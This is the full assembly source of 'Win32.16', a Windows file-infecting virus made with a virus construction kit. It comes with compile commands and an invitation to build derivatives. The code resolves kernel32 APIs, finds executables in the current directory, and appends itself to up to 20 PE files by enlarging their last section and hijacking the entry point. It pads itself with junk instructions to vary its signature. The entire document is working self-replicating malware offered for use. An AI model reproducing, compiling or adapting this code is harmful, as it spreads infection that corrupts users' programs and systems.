              
;
;
; Win32.16 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.16
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 16
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 15
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 34022 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
 sub eax, offset Delta
 inc edx                                ; Trash
                                        ; mov ebp, eax
                                        ; clear ebp
 mov ebp, -39661d
 add ebp, 39661d
 add ebp, eax
 jmp KernelSearchStart


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear ebx
 and ebx, 0
 xor ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, ebx
 add edx, [ebx+3Ch]
                                        ; get File Alignment
 mov eax, [edx+3Ch]
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], eax
 or edx, ebx                            ; Trash
 push ecx
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 mov esi, ecx
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 dec edx
 add eax, edx                           ; Trash
 imul edx, edx, 28h
                                        ; add ecx, 120
 inc ecx
 xor dword ptr [ebp+Trash1], 1228162    ; Trash
 add ecx, 119d
 add ecx, edx
 mov ebx, dword ptr [esi+74h]
 sal ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], 0
 add dword ptr [ebp+OldBase], edx
 rcl eax, 1d                            ; Trash
 mov edx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], edx
                                        ; clear edx
 push 0
 pop edx

 add edx, [ecx+10h]
                                        ; mov eax, edx
 push edx
 pop eax
 shr ebx, 16d                           ; Trash
 add edx, [ecx+14h]
 push edx
 push eax
 pop ebx
 add ecx, 0Ch
 add ebx, [ecx]
 sub ecx, 0Ch
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 sub ebx, ebx

 add ebx, [ecx+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add ebx, VirusSize
 pop dword ptr [ebp+AlignReg2]
 and dword ptr [ebp+Trash1], 681005     ; Trash
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], ebx
 pop ebx
 add ebx, VirusSize
 mov dword ptr [ecx+08h], ebx
 mov ebx, dword ptr [ecx+10h]
 mov dword ptr [ebp+Trash1], eax        ; Trash
 add ebx, dword ptr [ecx+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '16'
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 mov esi, ebp
 add esi, offset Virus
 inc dword ptr [ebp+Trash1]             ; Trash

 add edi, dword ptr [ebp+MapAddress]
 rcl edx, 3d                            ; Trash

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov edx, dword ptr [ebp+InfCounter]
 add edx, -1
 mov dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea ecx, [ebp+WFD_nFileSizeLow]
 xchg ebx, ecx

 cmp dword ptr [ebx], 20000d
 jbe NoInfection
                                        ; check for maximum filesize
 lea esi, [ebp+WFD_nFileSizeHigh]
 xchg eax, esi

 cmp dword ptr [eax], 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [ecx], 'ZM'
 je Goodfile
                                        ; clear eax
 sub eax, eax
 dec eax
 add eax, 1
 jz Notagoodfile
 and dword ptr [ebp+Trash1], 1274609    ; Trash

Goodfile:
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [ecx+3Ch]
 shl eax, 20d                           ; Trash
                                        ; add ebx, 1
 add ebx, 1d
 dec ebx
 jz Notagoodfile
 push dword ptr [ecx+3Ch]
 sar eax, 9d                            ; Trash
 pop esi
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '16'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov ax, word ptr [esi+16h]
 and ax, 00002h
 adc dword ptr [ebp+Trash1], 1352735    ; Trash
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 sub ebx, eax                           ; Trash
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 and edx, 0
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov eax, 80000000h or 40000000h
 push eax
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 push 0
 pop ecx
 push ecx
 push ebx
 sub edx, 57224228d                     ; Trash
 push ecx
                                        ; mov edx, 4
 mov edx, 4d
 push edx
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 push eax
 pop dword ptr [ebp+MapHandle]
 pop ebx
 cmp eax, 0
 je CloseFile
                                        ; clear eax
 mov eax, 0
 push ebx
 push eax
 push eax
                                        ; mov ecx, 2
 push 2d
 pop ecx
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 adc ecx, 6862818d                      ; Trash
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


 add ecx, ebx                           ; Trash


                                        ; clear ebx
 mov ebx, 0
 add ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 push ebx
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
                                        ; mov ebx, ecx
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, ecx
                                        ; mov esi, ebx
                                        ; clear esi
 mov esi, 56941d
 sub esi, 56941d
 add esi, ebx
 mov dword ptr [ebp+TempApisearch2], 0
 add dword ptr [ebp+TempApisearch2], esi
 mov dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear ecx
 xor ecx, ecx
 add ecx, dword ptr [edx]
 LoopChsksm:
                                        ; clear eax
 mov eax, -65383d
 add eax, 65383d
 mov al, byte ptr [esi]
                                        ; add esi, 1
 sub esi, -1d
 shl ax,8d
 sub ecx, eax
 test ax, ax
 jz LoopConti
                                        ; clear eax
 xor eax, eax
 mov al, byte ptr [esi]
                                        ; add esi, 1
 inc esi
 add dword ptr [ebp+Trash1], 1130223    ; Trash
 sub ecx, eax
 or ax, ax
 jnz LoopChsksm
LoopConti:
                                        ; add ecx, 1
 sub ecx, -1d
 sub ecx, 1
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov edx, dword ptr [ebp+TempApisearch3]
 mov esi, dword ptr [ebp+TempApisearch2]
                                        ; add ebx, 4
 add ebx, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2002h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal eax, 1                             ; multiply with 2
 sub ebx, ebx                           ; Trash
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, esi
                                        ; clear eax
 xor eax, eax
 mov ax, word ptr [esi]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [eax]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; mov eax, -1
 mov eax, ( -1d + 4d )
 sub eax, 4d
 and eax, dword ptr [ebp+OldEIP]

 push eax
 pop dword ptr [ebp+retEIP]
 mov ecx, 85836428d                     ; Trash

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;                  [ ///// * Data * \\\\\ ]

Data:
 Trash1      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 db 'Win32.16 by SnakeByte',0
 NewEIP      dd 0h
 TempApisearch3 dd 0h
 AlignReg2   dd 0h
 counter     dw 0h
 ATableVA    dd 0h
 FileHandle  dd 0h
 MapHandle   dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h

 KernelMZ    dd 0h
 AlignReg1   dd 0h
 NewSize     dd 0h
 InfCounter  dd 0h
 KernelPE    dd 0h
 OldBase     dd 400000h
 OTableVA    dd 0h
 OldEIP      dd 0h
 NTableVA    dd 0h
 TempAPI     dd 0h
 FindHandle  dd 0h
 MapAddress  dd 0h
 filemask    db '*.EXe',0
 TempApisearch2 dd 0h
 K32Trys     dd 0h

 APINames:
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi


                                        ; get Kernel by using hardcoded values
 mov ecx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov ecx, 077e00000h
 call GetKernel32
 jnc GetApis
 mov ecx, 0bff70000h
 call GetKernel32
 jnc GetApis

 rcl edx, 29d                           ; Trash
 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear edx
 mov edx, -13722d
 add edx, 13722d

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[edx]
 mov edx, ebp
 add edx, offset GetKernel32Exception

 push edx
 push eax
 ror ebx, 12d                           ; Trash

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 7h

GK1:                                    ; check for DOS-EXE Stub
 push dword ptr [ebp+K32Trys]
 xor eax, 43874305d                     ; Trash
 pop ebx
 or ebx, ebx
 jz GetKernel32NotFound
                                        ; check for ZM
 movzx edx, word ptr [ecx]
 xor edx, 'ZM'
 jz CheckPE

GK2:
 sub ecx, 65536d
 mov eax, dword ptr [ebp+K32Trys]
 adc edx, 6869999d                      ; Trash
 dec eax
 mov dword ptr [ebp+K32Trys], eax
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
                                        ; add ecx, 60
 inc ecx
 add ecx, 59d
 mov eax, [ecx]
 inc ecx
 sub ecx, 61d
 xchg eax, ecx
 add ecx, eax
 xchg eax, ecx
                                        ; check for EP
 movzx edx, word ptr [eax]
 xor edx, 'EP'
 jz CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add eax, 22
 dec eax
 add eax, 23d
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [eax]
 and dx, 0F000h
 cmp dx, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 inc eax
 sub eax, 23d


KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 mov dword ptr [ebp+KernelPE], 0
 xor dword ptr [ebp+KernelPE], eax

                                        ; clear esi
 sub esi, esi

 pop dword ptr fs:[esi]
 pop edx
 popad
 clc
ret

GetKernel32Exception:
 adc edx, 435344d                       ; Trash
                                        ; clear edx
 mov edx, -12678d
 add edx, 12678d

 mov ecx, dword ptr fs:[edx]
 mov esp, dword ptr [ecx]
GetKernel32NotFound:
                                        ; clear eax
 and eax, 0

 pop dword ptr fs:[eax]
 pop ebx
 popad
 stc
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear esi
 xor esi, esi
 add esi, [ebx+78h]
 add esi, [ebp+KernelMZ]
                                        ; add esi, 28
 add esi, 28d
                                        ; get ATableVA
 mov ebx, dword ptr [esi]
                                        ; add esi, 4
 dec esi
 add esi, 5d
 add ebx, [ebp+KernelMZ]
 or eax, edx                            ; Trash
 mov dword ptr [ebp+ATableVA], ebx
 adc edx, eax                           ; Trash
                                        ; get NTableVA
 mov ebx, dword ptr [esi]
                                        ; add esi, 4
 inc esi
 add esi, 3d
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; get OTableVA
 mov ebx, dword ptr [esi]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; number of API's we're looking for
 mov eax, NumberOfApis

                                        ; load API Names and Offsets
 lea ebx, [ebp+APINames]
 xchg edx, ebx

 lea esi, [ebp+APIOffsets]


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 inc edx
 add edx, 3d
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], ebx
                                        ; add esi, 4
 dec esi
 add esi, 5d
 dec eax
 jnz GetApisLoop
 mov edx, offset Outbreak
 add edx, ebp

 push edx
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA
 sbb ebx, 8d                            ; Trash

 push esi
 push eax
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov esi, offset WIN32_FIND_DATA
 add esi, ebp

 push esi
                                        ; clear edx
 mov edx, 54546d
 sub edx, 54546d
 xor edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, edi

                                        ; mov ecx, 276
 mov ecx, ( 276d - 32d )
 add ecx, 32d
                                        ; clear eax
 push 0
 pop eax
 rep stosb
 popad
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea edx, [ebp+filemask]
 xchg eax, edx

                                        ; Find File to infect
 call FindFirstFileProc
 xor edx, ebx                           ; Trash
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; mov edx, -1
 mov edx, ( -1d xor 18d )
 xor edx, 18d
 and edx, dword ptr [ebp+InfCounter]
 test edx, edx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear edi
 mov edi, 47189d
 sub edi, 47189d
 xor edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

